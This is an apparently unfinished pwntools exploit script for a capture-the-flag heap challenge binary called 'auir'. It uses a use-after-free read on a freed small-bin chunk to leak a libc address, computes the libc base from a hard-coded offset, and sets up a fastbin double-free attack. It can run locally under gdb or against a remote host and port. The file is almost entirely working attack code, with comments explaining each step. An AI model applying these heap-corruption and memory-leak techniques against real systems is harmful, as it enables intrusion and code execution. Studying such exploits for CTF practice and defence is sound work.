#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
context.m_gdb = "pwndbg"
gdb_bool = True
#gdb_bool = False

def make_zealots(size,content):
    r.sendlineafter(">>","1")
    r.sendlineafter(">>",str(size))
    r.sendlineafter(">>",str(content))

def destroy_zealots(index):
    r.sendlineafter(">>","2")
    r.sendlineafter(">>",str(index))

def fix_zealot(index,size,content):
    r.sendlineafter(">>","3")
    r.sendlineafter(">>",str(index))
    r.sendlineafter(">>",str(size))
    r.sendlineafter(">>",str(content))    

def display_skills(index):
    r.sendlineafter(">>","4")
    r.sendlineafter(">>",str(index))
    r.recvuntil("SHOWING....\n")
    return u64(r.recv(6).ljust(8, '\x00'))    


def exploit(r):

    #addr of array of pointer to chunks allocated: 0x605310


    make_zealots(0x80,"A"*10) #allocs a small bin
    make_zealots(0x80,"B"*10) #allocs another small bin

    destroy_zealots(0) #frees the first bin, we do not free(1) because it is next to the top chunk
    leak = display_skills(0)
    print(hex(leak))

    #to calc base of libc we can see where libc is loaded and subtract that from our leak
    #that will give us how far away our leak is from libc(leak-libc load addr = offset) (offset from libc)
    #then we can use to calc the base of libc (leak - offset = libc base)
    libc = leak - 0x3c4b78


    destroy_zealots(1) #reset

    make_zealots(0x60,"C"*10) #chunk 2fastbin
    make_zealots(0x60,"D"*10) # chunk 3fastbin
    make_zealots(0x80,"E"*10) #chunk 4small bin to avoid merging with top chunk


    '''
    Fastbin attack: 
        free(0)
        free(1)
        free(0)
    '''
    destroy_zealots(2) 
    destroy_zealots(3) 
    destroy_zealots(2) 



    


    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./auir"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        #r = process(binary_name)
        #print util.proc.pidof(r)
        gdb_cmd = [

            "c"


        ]
        if(gdb_bool):
            #gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

